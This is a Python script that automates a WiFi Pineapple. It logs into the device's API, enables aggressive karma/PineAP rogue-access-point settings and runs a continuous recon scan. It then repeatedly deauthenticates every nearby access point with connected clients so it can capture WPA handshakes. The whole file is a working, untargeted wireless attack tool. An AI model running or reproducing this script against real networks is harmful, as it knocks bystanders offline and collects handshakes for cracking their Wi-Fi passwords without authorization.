import requests
import time
import logging
import os
from datetime import datetime
import json

# wifi pineapple settings
config = {
    'server_ip': "172.16.42.1", # wifi pineapple IP
    'server_port': 1471, # wifi pinepple API/HTTP port
    'admin_user': "root", # wifi pineapple username
    'admin_password': "1111", # wifi pineapple password
    'ap_deauth_sleep': 30, # seconds between AP deauth attempts
    'ap_deauth_cycles': 3, # how many deauth attempts before moving to the next AP
    'api_sleep': 5, # seconds between API calls; avoids 500 errors from overloading the pineapple webservice
    'initial_recon_duration': 30 # recon scan duration (in seconds)
}

# logging
logs_dir = "logs"
os.makedirs(logs_dir, exist_ok=True)
log_filename = os.path.join(logs_dir, datetime.now().strftime("berserker-log-%Y-%m-%d-%H-%M-%S.txt"))
logging.basicConfig(
    filename=log_filename,
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filemode='w'
)

def log_and_print(message):
    print(message)
    logging.info(message)

def authenticate():
    response = requests.post(
        f"http://{config['server_ip']}:{config['server_port']}/api/login",
        json={'username': config['admin_user'], 'password': config['admin_password']},
        headers={'Content-Type': 'application/json'}
    )
    if response.status_code != 200:
        log_and_print(f"Authentication Error: {response.status_code}, {response.text}")
        exit()
    return response.json()['token']

auth_token = authenticate()

def authorized_request(method, resource, params=None, message=None):
    if message:
        log_and_print(f"> {message}")

    endpoint = f"http://{config['server_ip']}:{config['server_port']}{resource}"
    headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {auth_token}'}
    time.sleep(config['api_sleep'])  # simulate slow device

    response = getattr(requests, method.lower())(endpoint, json=params, headers=headers) if params else getattr(requests, method.lower())(endpoint, headers=headers)
    
    if response.status_code != 200:
        log_and_print(f"Request Error: {response.status_code}, {response.text}")
        exit()

    return response.json()

def set_aggro():
    pineAP_aggro_settings = {
        'mode': 'advanced',
        'settings': {
            'ap_channel': '11',
            'autostart': True,
            'autostartPineAP': True,
            'beacon_interval': 'AGGRESSIVE',
            'beacon_response_interval': 'AGGRESSIVE',
            'beacon_responses': True,
            'broadcast_ssid_pool': True,
            'capture_ssids': True,
            'connect_notifications': False,
            'disconnect_notifications': False,
            'enablePineAP': True,
            'karma': True,
            'logging': True,
            'pineap_mac': '00:13:37:A8:1C:BB',
            'target_mac': 'FF:FF:FF:FF:FF:FF'
        }
    }
    authorized_request("PUT", "/api/pineap/settings", pineAP_aggro_settings, "Enabling pineAP (AGGRO settings)")

def run_scand():
    try:
        set_aggro()
        # authorized_request("POST", "/api/recon/stop", None, "Stopping previous recon scan (if still running)")
        scan = authorized_request("POST", "/api/recon/start", {
            'live': True,
            'autoHandshake': True, # what does this actually do? /api/pineap/handshakes/check shows captureRunning == false
            'scan_time': 0,
            'band': '0'
        }, "Starting a continuous recon scan")

        if scan.get('scanRunning') != 1:
            log_and_print("> Recon scan failed, check logs")
            exit()

        log_and_print(f"> Scan initiated (ID: {scan['scanID']})")
        log_and_print(f"> Sleeping for {config['initial_recon_duration']} seconds so the recon list can populate")
        time.sleep(config['initial_recon_duration'])

        while True:
            scan_results = authorized_request("GET", f"/api/recon/scans/{scan['scanID']}")
            
            if scan_results.get('APResults') is None:
                log_and_print(f"> No APs found in recon scan. Waiting another {config['initial_recon_duration']} seconds.")
                time.sleep(config['initial_recon_duration'])
                continue

            for ap in scan_results.get('APResults', []):
                #if ap.get('clients') and ap['bssid'] not in [req['bssid'] for req in handshake_req]:
                if ap.get('clients') is not None:
                    log_and_print(f"> Found AP with clients ({ap.get('ssid')})")
                    authorized_request("POST", "/api/pineap/handshakes/start", ap, f"Starting handshake capture on AP: ({ap.get('ssid')})")
                        
                    legacy_hs = authorized_request("GET", "/api/pineap/handshakes")
                    if legacy_hs.get('handshakes') is not None:
                        legacy_hs_count = len(legacy_hs.get('handshakes'))
                    else:
                        legacy_hs_count = 0

                    for i in range(config.get('ap_deauth_cycles')): # total ap deauth cycle time: ap_deauth_cycles * ap_deauth_sleep
                        client_macs = []

                        for client_mac in ap.get('clients', []):
                            client_macs.append(client_mac.get('client_mac'))

                        deauth_payload = {
                            "bssid": ap.get('bssid'),
                            "multiplier": ap.get('multiplier'), #or 0, # null
                            "channel": ap.get('channel'),
                            "clients": client_macs
                        }
                        
                        
                        authorized_request("POST", "/api/pineap/deauth/ap", deauth_payload, f"De-authing AP {ap.get('ssid')} and all connected clients.")
                        log_and_print(f"> De-authing again in {config.get('ap_deauth_sleep')}. Cycle: {i+1} of {config.get('ap_deauth_cycles')}")
                        if i != config.get('ap_deauth_cycles')-1:
                            time.sleep(config.get('ap_deauth_sleep'))

                        handshake_count = authorized_request("GET", "/api/pineap/handshakes")
                        if handshake_count.get('handshakes') is not None:
                            if len(handshake_count.get('handshakes')) > legacy_hs_count:
                                log_and_print(f"\n\n> Handshake captured! ({ap.get('ssid')}) Continuing...\n\n")
                                legacy_hs_count += 1
                        else:
                            log_and_print(f"> Tried for {config.get('ap_deauth_cycles') * config.get('ap_deauth_sleep')} seconds, moving on to next AP...")
                            authorized_request("POST", "/api/pineap/handshakes/stop")
                else:
                    log_and_print(f"No clients associated with {ap.get('ssid')}.  Trying the next AP.")

    except KeyboardInterrupt:
        log_and_print("> Interrupted by user. Stopping scan/capture and exiting cleanly...")
        authorized_request("POST", "/api/pineap/handshakes/stop")
        # authorized_request("POST", "/api/recon/stop")
        exit()

def main():
    log_and_print("> Starting berserker.py by salt-or-ester (geek with a cold heart)")
    log_and_print("> https://gitgud.io/saltorester/wifi-pineapple-berserker/\n")
    run_scand()

if __name__ == "__main__":
    main()
